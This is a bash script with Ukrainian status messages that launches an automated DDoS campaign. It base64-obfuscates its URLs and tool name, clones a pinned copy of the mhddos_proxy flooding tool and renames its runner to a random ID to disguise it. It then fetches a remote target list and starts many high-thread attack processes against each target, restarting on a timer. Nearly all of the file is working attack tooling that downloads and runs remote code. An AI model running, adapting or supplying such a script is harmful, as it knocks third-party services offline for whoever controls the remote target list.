#!/bin/bash

# More safety, by turning some bugs into errors.
# Without `errexit` you don’t need ! and can replace
# PIPESTATUS with a simple $?, but I don’t do that.
set -o errexit -o pipefail -o noclobber -o nounset

# -allow a command to fail with !’s side effect on errexit
# -use return value from ${PIPESTATUS[0]}, because ! hosed $?
! getopt --test > /dev/null
if [[ ${PIPESTATUS[0]} -ne 4 ]]; then
    echo "На жаль, `getopt --test` завершився з помилкою. Будь ласка, встановіть enhanced getopt."
    exit 1
fi

OPTIONS=u:e:
LONGOPTS=url-with-goals:,execution-id:

# -regarding ! and PIPESTATUS see above
# -temporarily store output to be able to check for errors
# -activate quoting/enhanced mode (e.g. by writing out “--options”)
# -pass arguments only via   -- "$@"   to separate them correctly
! PARSED=$(getopt --options=$OPTIONS --longoptions=$LONGOPTS --name "$0" -- "$@")
if [[ ${PIPESTATUS[0]} -ne 0 ]]; then
    # e.g. return value is 1
    #  then getopt has complained about wrong arguments to stdout
    exit 2
fi

# read getopt’s output this way to handle the quoting right:
eval set -- "$PARSED"

refresh_interval="$(( $RANDOM % 20 + 10 ))m"
thread_count="$(( $RANDOM % 150 + 150 ))"
process_count="$(( $RANDOM % 10 + 10 ))"
stats_interval="$(( $RANDOM % 45 + 45 ))"

url_with_goals=$(echo 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FydWllbTIzNC9hdXRvX21oZGRvcy9tYWluL3J1bm5lcl90YXJnZXRzCg==' | base64 -d)
execution_id="${EXECUTION_ID:-2b089943-9daa-4990-85a0-8d8855d67572}"

# now enjoy the options in order and nicely split until we see --
while true; do
    case "$1" in
        -u|--url-with-goals)
            url_with_goals="$2"
            shift 2
            ;;
        -e|--execution-id)
            execution_id="$2"
            shift 2
            ;;
        --)
            shift
            break
            ;;
        *)
            echo "Невідома опція запуску $1"
            exit 3
            ;;
    esac
done

TOOL=$(echo 'bWhkZG9zCg==' | base64 -d)

HELPER_PROJECT_NAME=$execution_id
HELPER_PROJECT_VERSION=309c4ab160c99b2e85496bbaf76611098cc1294c
HELPER_PROJECT_URL=$(echo 'aHR0cHM6Ly9naXRodWIuY29tL3BvcnRob2xlLWFzY2VuZC1jaW5uYW1vbi9taGRkb3NfcHJveHkuZ2l0Cg==' | base64 -d)

HELPER_DIR=~/$HELPER_PROJECT_NAME
HELPER_FILE=$HELPER_DIR/${TOOL}/files/proxies/proxies.txt

echo "ініціалізація..."

# make sure ifstat and awk are installed
apt-get install ifstat gawk -y &> /dev/null

# remove unnecessary built-in python dependencies
python3 -m pip uninstall google-colab datascience -y &> /dev/null
python3 -m pip install --upgrade pip &> /dev/null

# run within user directory
cd ~

# delete old proxy dir if present
if [ -d $HELPER_DIR ]; then
    rm -r $HELPER_DIR &> /dev/null
fi

# download specific mhddos_proxy version
git clone $HELPER_PROJECT_URL $HELPER_PROJECT_NAME &> /dev/null
cd $HELPER_DIR
git checkout $HELPER_PROJECT_VERSION &> /dev/null

# install mhddos_proxy dependencies
python3 -m pip install -r requirements.txt &> /dev/null

mv $HELPER_DIR/"$(echo 'cnVubmVyLnB5Cg==' | base64 -d)" $HELPER_DIR/$execution_id.py
echo "# $execution_id" >> $HELPER_DIR/$execution_id.py

echo "ініціалізацію завершено"

# Restarts task and updates goals every $refresh_interval
while true
do
    # stop all processes
    echo "(ре)старт програми..."
    if pgrep -f $execution_id.py &> /dev/null; then pkill -f $execution_id.py &> /dev/null; fi
    if pgrep -f ifstat &> /dev/null; then pkill -f ifstat &> /dev/null; fi
    echo "(ре)старт програми завершено"

    # delete old proxy file if present
    if [ -f $HELPER_FILE ]; then
        rm $HELPER_FILE
    fi

    # load file and process them one-by-one
    curl -s $url_with_goals | cat | grep "^[^#]" | while read -r goal_command ; do
      for (( i=1; i<=process_count; i++ ))
      do
          cd $HELPER_DIR
          python3 $execution_id.py $goal_command -t $thread_count -p 25200 --rpc 1000 &> /dev/null&

          # wait till the first process initializes helper file properly
          if [ ! -f $HELPER_FILE ]; then
              echo "перевірка середовища..."

              while [ ! -f $HELPER_FILE ]
              do
                  sleep 1
              done

              echo "перевірку середовища завершено"
          fi
      done
  done
  echo -e "працюємо з $goal_command; oновлення через $refresh_interval\n"

  ifstat -i eth0 -t -b -n $stats_interval/$stats_interval | awk '$1 ~ /^[0-9]{2}:/{$2/=1024;$3/=1024;printf "[%s] %10.2f ↓MBit/s↓  %10.2f ↑MBit/s↑\n",$1,$2,$3}'&

  sleep $refresh_interval
done
